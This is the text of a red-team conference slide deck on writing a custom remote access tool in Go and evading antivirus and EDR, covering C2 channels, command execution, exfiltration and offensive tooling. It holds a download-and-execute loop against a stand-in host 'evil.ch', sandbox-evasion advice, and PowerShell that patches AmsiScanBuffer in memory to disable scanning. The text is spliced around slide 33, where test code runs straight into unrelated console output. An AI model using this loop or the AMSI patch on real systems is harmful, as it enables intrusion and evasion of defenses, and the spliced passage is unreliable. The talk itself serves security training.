1
RAT Development
06/01/2022
Develop 
your own
RAT
EDR & AV Defense
Dobin Rutishauser
@dobinrutis
https://bit.ly/3Qg219P
2
RAT Development
06/01/2022
Developer // TerreActive
Pentester  // Compass Security
Developer  // UZH
SOC Analyst // Infoguard
RedTeam Lead // Raiffeisen
About
SSL/TLS Recommendations
// OWASP Switzerland
Burp Sentinel - Semi Automated Web Scanner
// BSides Vienna
Automated WAF Testing and XSS Detection
// OWASP Switzerland Barcamp
Fuzzing For Worms - AFL For Network Servers
// Area 41 
Memory Corruption Exploits & Mitigation
// BFH Berner Fachhochschule
Gaining Access
// OST Ostschweizer Fachhochschule
3
RAT Development
06/01/2022
Red Teaming / Scope
RAT Development
EDR & AV Defense
Conclusion
Diving into the code, 17min
Background, 5min
Bypass all the things, 17min
What does it all mean, 6min
01
02
03
04
4
RAT Development
06/01/2022
Develop 
your own
RAT
Red Teaming
5
RAT Development
06/01/2022
Red Teaming
Red Teaming realistically tests overall security posture
●
Not pentest!
●
Simulate certain types of adversaries (CTI)
●
Focus on TTP’s (Tools, Techniques, Procedures)
●
Not so much focus on vulnerabilities
●
Credential stealing, lateral movement, data exfiltration
●
Testing the BlueTeam  / SOC
●
PurpleTeaming
(See talk “Building a Red Team” yesterday by Daniel Fabian)
6
RAT Development
06/01/2022
Client 
Workstation
HTTP Server
HTTP Proxy
Antivirus
EDR
Sysmon
SIEM/SOAR
Antivirus
Sandbox
Domain Reputation
Content Filter
●
No admin privileges
●
There’s a SOC
●
Internet only via 
authenticated HTTP 
proxy
Target Security,  Products
7
RAT Development
06/01/2022
Windows Client
What is a RAT?
RAT.exe
Remote Access Tool
Client
Beacon
Implant
C2
https://dobin.ch
Command & Control
8
RAT Development
06/01/2022
https://www.microsoftpressstore.com/articles/article.aspx?p=2992603
Killchain
9
RAT Development
06/01/2022
Everyone uses CobaltStrike 
Everyone detects CobaltStrike
Writing a RAT yourself may solve 
some of your problems?
Why write a RAT?
10
RAT Development
06/01/2022
Windows Client
What is a RAT?
RAT.exe
Windows 
Client
Server
In Scope:
Execute RAT
Execute Tools
Not In Scope:
Recon
Exploit
Lateral movement
Privilege escalation
(attacking)
11
RAT Development
06/01/2022
Develop 
your own
RAT
RAT 
Development
Keep It Simple, Stupid
12
RAT Development
06/01/2022
while True:
curl evil.ch/getCommand > exec && ./exec
Your first RAT
13
RAT Development
06/01/2022
Antnium
“Anti-Tanium” (now also Anti-Defender)
github.com/dobin/antnium (300+ commits)
github.com/dobin/antnium-ui (200+ commits)
Antnium
14
RAT Development
06/01/2022
Programming languages:
●
Now native: 
○
C, C++, NIM, Zig
○
Go, Rust, Hare
●
Before “managed”: 
○
Powershell, C#
(Go) features: 
●
Compiled
●
Garbage collection yay
●
Cross compiling (Win, Linux)
●
Reasonably big RedTeaming 
ecosystem
●
Can compile as DLL
Choosing a programming language
15
RAT Development
06/01/2022
Use HTTPS as communication channel
●
Simple
●
Reliable
●
Always available
●
Hard to monitor
●
Just need two endpoints:
○
/getCommand
○
/sendAnswer
●
(C2 obfuscation not in scope here)
Communication channel
16
RAT Development
06/01/2022
HTTP communication channel
C2
Go
RAT
Go
Operator UI
Angular
DB
17
RAT Development
06/01/2022
HTTP communication channel
C2
RAT
Operator 
UI
DB
ClientId
PacketId
Arguments
Response
42
1
Cmd: hostname
client
42
2
Cmd: whoami
c2.ch/get/42
add
c2.ch/put/2
18
RAT Development
06/01/2022
type Packet struct {
ClientId     string         
PacketId     string         
PacketType   string         
Arguments    map[string]string
Response     map[string]string
DownstreamId string         
}
"Packet": {
    "clientid": "c88ld5qsdke1on40m5a0",
    "packetid": "59650232820019",
    "packetType": "exec",
    "arguments": {
        "commandline": "hostname",
        "shelltype": "cmd",
    },
    "response": {},
    "downstreamId": "client"
 },
Packet structure
19
RAT Development
06/01/2022
Demo: HTTP
ID: T1071.001: Command and Control: Web Protocols
ID: T1132.001: Command and Control: Standard Encoding
ID: T1573.001: Command and Control: Encrypted Channel, Symmetric Encryption
ID: T1090.002: Command and Control: External Proxy
20
RAT Development
06/01/2022
C2 Server
RAT
Forwarder 
@ EC2
c2.shop.ch
RAT
Forwarder 
@ GCP
c2.bank.ch
C2 Server
UI
Reverse 
Proxy
ClientKey
ClientKey
GIT
UI
C2 Infrastructre Architecture
Trusted
21
RAT Development
06/01/2022
c := Campaign {
ApiKey:    "secretKeyOperator",
EncKey:    "secretKeyClient"
ServerUrl: "c2.notavirus.ch",
PacketSendPath:      "/send",
PacketGetPath:       "/get/",
FileUploadPath:      "/upload/",
FileDownloadPath:    "/static/",
ClientWebsocketPath: "/ws",
AuthHeader:          "X-Session-Token",
UserAgent:           "Go-http-client/1.1",
}
Campaign Config
22
RAT Development
06/01/2022
Websocket Communication Channel
C2
RAT
Operator 
UI
DB
Websocket: 
●
Instant
●
Stealthy
Websocket
Websocket
23
RAT Development
06/01/2022
Demo: Websockets
ID T1008: Command and Control: Fallback Channels
ID: T1059.001 Execution: Command and Scripting Interpreter: Powershell
ID: T1059.003 Execution: Command and Scripting Interpreter: Windows Command Shell0
24
RAT Development
06/01/2022
Websocket Communication Channel
C2
DB
Dev Problems with Websockets:
●
Architecture is upside down
●
Clients are online / offline
●
Client needs to handle disconnects
○
Reconnects
○
Downgrades
○
Upgrades
●
Goroutines + Channels en masse
Thread
Blocking
send
25
RAT Development
06/01/2022
Server Architecture
26
RAT Development
06/01/2022
RAT’s need to execute commands
●
net.exe, ipconfig, wmic, and other lolbins
●
cmd.exe / powershell.exe command lines
●
Maybe have a persistent shell too
Command Execution
27
RAT Development
06/01/2022
Demo: Command Execution
ID: T1059.001 Execution: Command and Scripting Interpreter: Powershell
ID: T1059.003 Execution: Command and Scripting Interpreter: Windows Command Shell
28
RAT Development
06/01/2022
Dev problems with execution
arguments:
●
commandline = “net user dobin”
●
commandline = []string{“net”, “user”, “dobin”}
●
commandline = “c:\program files\test.exe”
●
Cmd.exe is different…
And: 
●
Capturing Stdout/Stderr
●
Managing long lasting processes
Demo: Command Execution
29
RAT Development
06/01/2022
UI/UX
●
Intuitive
●
Reliable
●
Effective
●
Every feature in the RAT needs UI!
Dev Problems: SPA
●
Angular, TypeScript
●
RXJS
●
Re-implement most of the server again 
○
Managing stream of packets
UI/UX
C2
Angular UI
Stream of packets 
+ notifications
Clients
Packets
Files
State
30
RAT Development
06/01/2022
Demo: File Browser, Upload, Download
ID T1105: Command and Control: Ingress Tool Transfer
ID T1020: Exfiltration: Automated Exfiltration
ID T1048.001: Exfiltration: Exfiltration Over Symmetric Encrypted Non-C2 Protocol
31
RAT Development
06/01/2022
Demo: Downstream / Wingman
32
RAT Development
06/01/2022
Making it reliable and robust with tests
●
Unittests
●
Integration Tests
●
REST Tests, Websocket Tests
●
Client->Server Tests, Server->Client Tests
●
Refactoring
But especially:
●
Reconnection Tests
●
Proxy Tests
●
Command Execution Tests
Reliability and Robustness
33
RAT Development
06/01/2022
# Test doing 80% code coverage
s := Server()
c := Client()
s.adminChannel  copy .\PowerView.ps1 .\PowerView2.ps1
PS E:\> . .\PowerView2.ps1
At E:\PowerView2.ps1:1 char:1
+ #requires -version 2
+ ~~~~~~~~~~~~~~~~~~~~
This script contains malicious 
content and has been blocked by
your antivirus software.
AMSI - detect on-load
39
RAT Development
06/01/2022
When developing your own RAT: 
●
Signature scanning:
○
No signatures :-) (FUD)
●
Heuristics 
○
Dont import too much functionality into the RAT
○
Or: Dynamic imports, D/Invoke
○
Generally not a problem
●
Sandbox
○
RAT doesnt do anything except waiting for commands
○
Detect sandbox and exit
○
Calculate some primes…
○
Generally not a problem
●
AMSI
○
Not applicable, as not .NET/Powershell
Defeating the AV
40
RAT Development
06/01/2022
Develop 
your own
RAT
execute
your tools
41
RAT Development
06/01/2022
List of Red Team tools
PE EXE/DLL, unmanaged
●
Mimikatz
●
Dumpert
.NET/C#, managed code
●
Rubeus
●
Seatbelt
●
SharpHound
●
SharpSploit
●
SharpUp
●
SharpView
Powershell:
●
ADRecon
●
PowerSploit (obsolete)
●
Load .NET in process
●
AMSI Pypass
●
Obfuscation + download
●
Reflective PE loader
●
Process injection shellcode
●
Obfuscation
●
AMSI bypass: amsi.fail
42
RAT Development
06/01/2022
CLRCreateInstance(CLSID_CLRMetaHost, 
     IID_ICLRMetaHost, (LPVOID*)&metaHost);
metaHost->GetRuntime(L"v4.0.30319", 
    IID_ICLRRuntimeInfo, (LPVOID*)&runtimeInfo);
runtimeInfo->GetInterface(
CLSID_CLRRuntimeHost, IID_ICLRRuntimeHost,
(LPVOID*)&runtimeHost);
runtimeHost->Start();
HRESULT res = runtimeHost-> ExecuteInDefaultAppDomain(
L"C:\\labs\\bin\\Debug\\CLRHello1.exe",
L"CLRHello1.Program", L"spotlessMethod", 
L"test", &pReturnValue);
Loading managed code
Code
.NET Runtime
AMSI.dll
Process
Executing Managed Code (.NET / Powershell bytecode)
exec
scan
43
RAT Development
06/01/2022
$LoadLibrary = [Win32]::LoadLibrary("amsi.dll")
$Address = [Win32]::GetProcAddress(
     $LoadLibrary, "AmsiScanBuffer")
$p = 0
[Win32]::VirtualProtect($Address,5,0x40,[ref]$p)
$Patch = (0xB8,0x57,0x00,0x07,0x80,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy(
     $Patch, 0, $Address, 6)